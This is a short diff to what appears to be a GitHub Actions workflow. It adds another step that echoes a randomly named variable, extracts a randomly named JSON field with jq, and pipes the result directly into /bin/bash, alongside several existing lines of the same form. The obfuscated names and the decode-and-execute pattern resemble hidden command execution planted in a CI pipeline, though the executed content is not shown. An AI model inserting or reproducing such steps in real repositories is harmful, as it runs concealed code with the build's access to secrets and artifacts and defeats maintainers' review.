@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$o37" | jq -r .msa05628 | /bin/bash
           echo $xxcko502 | jq -r .reab4 | /bin/bash
           echo $qrby5467 | jq -r .ressl42 | /bin/bash
+          echo $vlga35 | jq -r .xiefs65421 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
